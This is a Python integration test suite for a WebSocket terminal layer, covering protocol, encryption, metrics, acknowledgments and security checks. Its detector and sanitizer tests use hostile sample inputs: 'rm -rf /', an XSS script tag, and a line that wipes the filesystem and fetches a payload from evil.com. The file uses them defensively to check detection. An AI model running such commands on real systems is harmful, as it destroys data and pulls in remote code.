"""End-to-end integration testing for WebSocket Communication Layer."""

import asyncio
import json
import time
from typing import Dict, Any, List
import structlog

logger = structlog.get_logger(__name__)


class IntegrationTestSuite:
    """End-to-end integration testing suite."""
    
    def __init__(self):
        self.test_results = {"passed": 0, "failed": 0, "total": 0, "details": []}
    
    def add_result(self, test_name: str, passed: bool, details: str = ""):
        """Add test result."""
        self.test_results["total"] += 1
        if passed:
            self.test_results["passed"] += 1
            status = "PASS"
            emoji = "✅"
        else:
            self.test_results["failed"] += 1
            status = "FAIL"
            emoji = "❌"
        
        self.test_results["details"].append({
            "test": test_name,
            "status": status,
            "details": details,
            "timestamp": time.time()
        })
        
        print(f"{emoji} {test_name}: {status}")
        if details:
            print(f"   {details}")
    
    async def test_complete_message_flow(self):
        """Test complete message processing flow."""
        print("\n🔄 Testing Complete Message Flow...")
        
        try:
            # Test protocol handling
            from .protocols import MessageProtocol, MessageType, ProtocolVersion
            protocol = MessageProtocol()
            
            # Test protocol negotiation
            success, version, reason = protocol.negotiate_protocol(
                ["1.2.0", "1.1.0"], {"compression": True, "acknowledgments": True}
            )
            self.add_result("Protocol Negotiation", success, f"Version: {version}")
            
            # Test message encoding with compression
            test_message = {"type": "terminal_data", "data": "A" * 1000, "session_id": "test"}
            encoded = protocol.encode_message(MessageType.TERMINAL_DATA, test_message)
            self.add_result("Message Encoding", len(encoded) > 0, f"Encoded size: {len(encoded)} bytes")
            
            # Test message decoding
            decoded = protocol.decode_message(encoded)
            self.add_result("Message Decoding", 
                          decoded.get("type") == "terminal_data",
                          "Message successfully decoded")
            
        except Exception as e:
            self.add_result("Complete Message Flow", False, f"Error: {e}")
    
    async def test_security_integration(self):
        """Test security components integration."""
        print("\n🛡️  Testing Security Integration...")
        
        try:
            # Test pattern detection
            from .pattern_detector import get_pattern_detector
            detector = get_pattern_detector()
            
            # Test with malicious content
            malicious_result = detector.analyze_message("rm -rf /", "test", "terminal")
            self.add_result("Malicious Pattern Detection", 
                          malicious_result.detected and malicious_result.risk_score > 0,
                          f"Risk score: {malicious_result.risk_score}")
            
            # Test audit logging integration
            from .audit_logger import get_audit_logger, AuditEventType, AuditSeverity
            audit_logger = await get_audit_logger()
            
            await audit_logger.log_security_event(
                AuditEventType.SECURITY_VIOLATION,
                "test_conn",
                {"violation_type": "integration_test"},
                "test_user"
            )
            
            stats = audit_logger.get_audit_stats()
            self.add_result("Security Audit Logging", 
                          stats["security_violations"] > 0,
                          f"Security violations logged: {stats['security_violations']}")
            
            # Test input sanitization
            from .sanitizer import get_terminal_sanitizer
            sanitizer = get_terminal_sanitizer()
            
            malicious_input = "<script>alert('xss')</script>"
            sanitized = sanitizer.sanitize_terminal_input(malicious_input)
            self.add_result("Input Sanitization", 
                          "<script>" not in sanitized,
                          f"Sanitized: {malicious_input} -> {sanitized}")
            
        except Exception as e:
            self.add_result("Security Integration", False, f"Error: {e}")
    
    async def test_compression_and_encryption_integration(self):
        """Test compression and encryption working together."""
        print("\n🔒 Testing Compression & Encryption Integration...")
        
        try:
            # Test compression
            from .compression import get_message_compressor, CompressionAlgorithm
            compressor = get_message_compressor()
            
            large_message = {"type": "test", "data": "Large data: " + "X" * 5000}
            compression_result = compressor.compress_message(large_message, CompressionAlgorithm.GZIP)
            
            # Check if compression was successful
            has_compressed_data = hasattr(compression_result, 'compressed_envelope')
            self.add_result("Message Compression", 
                          has_compressed_data,
                          f"Compression attempted for large message")
            
            # Test encryption
            from .encryption import MessageEncryption
            encryption = MessageEncryption()
            
            test_data = {"sensitive": "data", "user": "test"}
            encrypted = encryption.encrypt_message(test_data, "test_conn")
            
            self.add_result("Message Encryption", 
                          "encrypted_data" in encrypted,
                          "Message successfully encrypted")
            
            # Test decryption
            decrypted = encryption.decrypt_message(encrypted, "test_conn")
            self.add_result("Message Decryption", 
                          decrypted == test_data,
                          "Decrypted data matches original")
            
        except Exception as e:
            self.add_result("Compression & Encryption Integration", False, f"Error: {e}")
    
    async def test_operational_metrics_integration(self):
        """Test operational metrics collection."""
        print("\n📊 Testing Operational Metrics Integration...")
        
        try:
            from .operational_metrics import get_operational_metrics
            metrics = await get_operational_metrics()
            
            # Register a test connection
            metrics.register_connection("test_conn", "test_user", "test_session")
            self.add_result("Connection Registration", 
                          "test_conn" in metrics.connection_resources,
                          "Connection registered for metrics tracking")
            
            # Record some metrics
            metrics.record_message_sent("test_conn", 1024, 15.5)
            metrics.record_message_received("test_conn", 512)
            
            # Get connection metrics
            conn_metrics = metrics.get_connection_metrics("test_conn")
            self.add_result("Metrics Collection", 
                          conn_metrics is not None and conn_metrics.bytes_sent > 0,
                          f"Bytes sent: {conn_metrics.bytes_sent if conn_metrics else 0}")
            
            # Get system snapshot
            system_snapshot = metrics.get_system_snapshot()
            self.add_result("System Monitoring", 
                          system_snapshot.cpu_percent >= 0,
                          f"CPU: {system_snapshot.cpu_percent}%, Memory: {system_snapshot.memory_percent}%")
            
            # Cleanup
            metrics.unregister_connection("test_conn")
            
        except Exception as e:
            self.add_result("Operational Metrics Integration", False, f"Error: {e}")
    
    async def test_acknowledgment_system_integration(self):
        """Test message acknowledgment system."""
        print("\n📨 Testing Acknowledgment System Integration...")
        
        try:
            from .acknowledgment import get_message_ack_system, MessagePriority
            ack_system = await get_message_ack_system()
            
            # Send message with acknowledgment
            test_message = {"type": "test", "data": "test message"}
            message_id = ack_system.send_message_with_ack(
                "test_conn",
                test_message,
                timeout_seconds=10,
                priority=MessagePriority.HIGH
            )
            
            self.add_result("Message Acknowledgment Setup", 
                          message_id is not None,
                          f"Message ID: {message_id}")
            
            # Check pending messages
            pending = ack_system.get_pending_messages("test_conn")
            self.add_result("Pending Message Tracking", 
                          len(pending) > 0,
                          f"Pending messages: {len(pending)}")
            
            # Process acknowledgment
            ack_result = ack_system.process_acknowledgment(message_id, {"status": "received"})
            self.add_result("Acknowledgment Processing", 
                          ack_result.success,
                          f"Response time: {ack_result.response_time_ms:.2f}ms")
            
            # Get statistics
            stats = ack_system.get_stats()
            self.add_result("Acknowledgment Statistics", 
                          stats["messages_acknowledged"] > 0,
                          f"Messages acknowledged: {stats['messages_acknowledged']}")
            
        except Exception as e:
            self.add_result("Acknowledgment System Integration", False, f"Error: {e}")
    
    async def test_binary_validation_integration(self):
        """Test binary data validation integration."""
        print("\n📦 Testing Binary Validation Integration...")
        
        try:
            from .binary_validator import get_binary_validator, BinaryFormat
            validator = await get_binary_validator()
            
            # Test normal binary data
            normal_data = b"Normal terminal output"
            result = await validator.validate_binary_data(normal_data, BinaryFormat.RAW_BYTES, "test")
            
            self.add_result("Binary Data Validation", 
                          result.valid,
                          f"Format: {result.format_detected}, Size: {result.size}")
            
            # Test with pattern detector on binary
            from .pattern_detector import get_pattern_detector
            detector = get_pattern_detector()
            
            malicious_binary = b"rm -rf / && wget http://evil.com/payload"
            binary_result = detector.analyze_binary_data(malicious_binary, "test_conn")
            
            self.add_result("Binary Pattern Detection", 
                          binary_result.detected or binary_result.risk_score > 0,
                          f"Risk score: {binary_result.risk_score}")
            
        except Exception as e:
            self.add_result("Binary Validation Integration", False, f"Error: {e}")
    
    async def test_rate_limiting_integration(self):
        """Test rate limiting integration."""
        print("\n⏱️  Testing Rate Limiting Integration...")
        
        try:
            # Test with pattern detector (which has rate limiting internally)
            from .pattern_detector import get_pattern_detector
            detector = get_pattern_detector()
            
            # Rapid fire requests to test rate limiting behavior
            results = []
            for i in range(10):
                result = detector.analyze_message(f"test message {i}", f"rate_test_{i}", "test")
                results.append(result)
            
            # All should succeed since we're not hitting actual rate limits in testing
            success_count = len([r for r in results if hasattr(r, 'detected')])
            self.add_result("Rate Limiting Behavior", 
                          success_count > 0,
                          f"Processed {success_count}/10 requests")
            
            # Test connection risk profiling
            risk_profile = detector.get_connection_risk_profile("rate_test_0")
            self.add_result("Connection Risk Profiling", 
                          risk_profile["message_count"] > 0,
                          f"Risk level: {risk_profile['risk_level']}")
            
        except Exception as e:
            self.add_result("Rate Limiting Integration", False, f"Error: {e}")
    
    async def test_protocol_features_integration(self):
        """Test advanced protocol features integration."""
        print("\n📡 Testing Protocol Features Integration...")
        
        try:
            from .protocols import MessageProtocol, MessageType, ProtocolVersion
            protocol = MessageProtocol()
            
            # Test protocol capabilities
            client_versions = ["1.2.0", "1.1.0", "1.0.0"]
            capabilities = {
                "compression": True,
                "acknowledgments": True,
                "binary_data": True,
                "enhanced_security": True
            }
            
            success, version, reason = protocol.negotiate_protocol(client_versions, capabilities)
            self.add_result("Advanced Protocol Negotiation", 
                          success and version >= ProtocolVersion(1, 2, 0),
                          f"Negotiated: {version} with capabilities")
            
            # Test protocol features
            features = protocol._get_protocol_features(version)
            self.add_result("Protocol Features", 
                          features.get("compression") and features.get("acknowledgments"),
                          f"Features: {list(features.keys())}")
            
            # Test protocol security
            protocol_status = protocol.get_protocol_status()
            self.add_result("Protocol Security Status", 
                          protocol_status["integrity_enabled"],
                          f"State: {protocol_status['state']}")
            
        except Exception as e:
            self.add_result("Protocol Features Integration", False, f"Error: {e}")
    
    async def test_end_to_end_scenario(self):
        """Test complete end-to-end scenario."""
        print("\n🚀 Testing End-to-End Scenario...")
        
        try:
            # Simulate complete WebSocket session flow
            from .pattern_detector import get_pattern_detector
            from .audit_logger import get_audit_logger, AuditEventType, AuditSeverity
            from .operational_metrics import get_operational_metrics
            
            detector = get_pattern_detector()
            audit_logger = await get_audit_logger()
            metrics = await get_operational_metrics()
            
            # 1. Connection establishment
            connection_id = "e2e_test_conn"
            user_id = "e2e_test_user"
            session_id = "e2e_test_session"
            
            # Register connection for metrics
            metrics.register_connection(connection_id, user_id, session_id)
            
            # Audit connection
            await audit_logger.log_event(
                AuditEventType.CONNECTION_ESTABLISHED,
                AuditSeverity.INFO,
                connection_id=connection_id,
                user_id=user_id
            )
            
            # 2. Message processing with security checks
            test_commands = [
                "ls -la",
                "cat file.txt", 
                "echo 'Hello World'",
                "python script.py"
            ]
            
            processed_count = 0
            for cmd in test_commands:
                # Pattern detection
                result = detector.analyze_message(cmd, connection_id, "terminal_data")
                
                # Record metrics
                metrics.record_message_received(connection_id, len(cmd))
                
                # Audit message
                await audit_logger.log_event(
                    AuditEventType.MESSAGE_RECEIVED,
                    AuditSeverity.INFO,
                    connection_id=connection_id,
                    user_id=user_id,
                    session_id=session_id,
                    message_type="terminal_data"
                )
                
                processed_count += 1
            
            # 3. Session cleanup
            await audit_logger.log_event(
                AuditEventType.CONNECTION_CLOSED,
                AuditSeverity.INFO,
                connection_id=connection_id,
                user_id=user_id,
                session_id=session_id
            )
            
            metrics.unregister_connection(connection_id)
            
            self.add_result("End-to-End Scenario", 
                          processed_count == len(test_commands),
                          f"Processed {processed_count} commands successfully")
            
            # Verify all systems recorded the activity
            audit_stats = audit_logger.get_audit_stats()
            detector_stats = detector.get_detection_stats()
            
            self.add_result("System Integration Verification", 
                          audit_stats["events_logged"] > 0 and detector_stats["messages_analyzed"] > 0,
                          f"Audit events: {audit_stats['events_logged']}, Analyzed: {detector_stats['messages_analyzed']}")
            
        except Exception as e:
            self.add_result("End-to-End Scenario", False, f"Error: {e}")
    
    async def run_all_tests(self):
        """Run all integration tests."""
        print("🔗 Starting WebSocket Integration Testing Suite")
        print("=" * 60)
        
        start_time = time.time()
        
        # Run all integration tests
        await self.test_complete_message_flow()
        await self.test_security_integration()
        await self.test_compression_and_encryption_integration()
        await self.test_operational_metrics_integration()
        await self.test_acknowledgment_system_integration()
        await self.test_binary_validation_integration()
        await self.test_rate_limiting_integration()
        await self.test_protocol_features_integration()
        await self.test_end_to_end_scenario()
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Generate integration report
        self.generate_integration_report(duration)
    
    def generate_integration_report(self, duration: float):
        """Generate comprehensive integration test report."""
        print("\n" + "=" * 60)
        print("🔗 INTEGRATION TEST REPORT")
        print("=" * 60)
        
        # Summary statistics
        total = self.test_results["total"]
        passed = self.test_results["passed"]
        failed = self.test_results["failed"]
        pass_rate = (passed / total * 100) if total > 0 else 0
        
        print(f"📊 Integration Test Summary:")
        print(f"   Total Tests: {total}")
        print(f"   Passed: {passed} ({'✅' if passed == total else '⚠️'})")
        print(f"   Failed: {failed} ({'✅' if failed == 0 else '❌'})")
        print(f"   Pass Rate: {pass_rate:.1f}%")
        print(f"   Duration: {duration:.2f} seconds")
        
        # Integration grade
        if pass_rate >= 95:
            grade = "A+ (Excellent Integration)"
            emoji = "🚀"
        elif pass_rate >= 90:
            grade = "A (Very Good Integration)"
            emoji = "✅"
        elif pass_rate >= 80:
            grade = "B (Good Integration)"
            emoji = "⚠️"
        else:
            grade = "C (Integration Issues)"
            emoji = "🔧"
        
        print(f"\n{emoji} Integration Grade: {grade}")
        
        # Failed tests details
        if failed > 0:
            print(f"\n❌ Failed Integration Tests ({failed}):")
            for detail in self.test_results["details"]:
                if detail["status"] == "FAIL":
                    print(f"   • {detail['test']}: {detail['details']}")
        
        # Production readiness
        print(f"\n🏭 Production Readiness Assessment:")
        if pass_rate == 100:
            print("   ✅ READY - All systems fully integrated and operational")
            print("   🚀 Deploy to production with confidence")
        elif pass_rate >= 95:
            print("   ✅ READY - Minor integration issues should be addressed")
            print("   ⚠️  Monitor closely during initial deployment")
        elif pass_rate >= 90:
            print("   ⚠️  CAUTION - Some integration issues detected")
            print("   🔧 Address failed tests before production deployment")
        else:
            print("   ❌ NOT READY - Significant integration issues")
            print("   🛠️  Complete integration fixes before deployment")
        
        # Component status summary
        print(f"\n🧩 Component Integration Status:")
        components = {
            "Message Protocol": any("Message" in d["test"] for d in self.test_results["details"] if d["status"] == "PASS"),
            "Security Layer": any("Security" in d["test"] for d in self.test_results["details"] if d["status"] == "PASS"),
            "Compression & Encryption": any("Compression" in d["test"] or "Encryption" in d["test"] for d in self.test_results["details"] if d["status"] == "PASS"),
            "Operational Metrics": any("Metrics" in d["test"] for d in self.test_results["details"] if d["status"] == "PASS"),
            "Acknowledgment System": any("Acknowledgment" in d["test"] for d in self.test_results["details"] if d["status"] == "PASS"),
            "Binary Validation": any("Binary" in d["test"] for d in self.test_results["details"] if d["status"] == "PASS"),
            "Rate Limiting": any("Rate" in d["test"] for d in self.test_results["details"] if d["status"] == "PASS"),
            "Protocol Features": any("Protocol" in d["test"] for d in self.test_results["details"] if d["status"] == "PASS"),
            "End-to-End Flow": any("End-to-End" in d["test"] for d in self.test_results["details"] if d["status"] == "PASS")
        }
        
        for component, status in components.items():
            status_emoji = "✅" if status else "❌"
            print(f"   {status_emoji} {component}")
        
        # Save detailed report
        self.save_integration_report(duration, pass_rate, grade)
        print(f"\n📄 Detailed report saved to: websocket_integration_report.json")
        print("=" * 60)
    
    def save_integration_report(self, duration: float, pass_rate: float, grade: str):
        """Save detailed integration report to file."""
        report = {
            "test_suite": "WebSocket Integration Testing",
            "version": "1.2.0",
            "timestamp": time.time(),
            "summary": {
                "total_tests": self.test_results["total"],
                "passed": self.test_results["passed"],
                "failed": self.test_results["failed"],
                "pass_rate_percent": pass_rate,
                "integration_grade": grade,
                "duration_seconds": duration
            },
            "test_results": self.test_results["details"],
            "production_readiness": {
                "ready_for_production": pass_rate >= 95,
                "recommended_action": (
                    "Deploy to production" if pass_rate >= 95
                    else "Address failed tests" if pass_rate >= 80
                    else "Complete integration fixes"
                ),
                "monitoring_requirements": [
                    "Monitor connection metrics",
                    "Track security violations",
                    "Verify acknowledgment rates",
                    "Monitor system performance"
                ]
            }
        }
        
        with open("websocket_integration_report.json", "w") as f:
            json.dump(report, f, indent=2)


async def run_integration_tests():
    """Main function to run integration tests."""
    test_suite = IntegrationTestSuite()
    await test_suite.run_all_tests()
    return test_suite.test_results


if __name__ == "__main__":
    asyncio.run(run_integration_tests())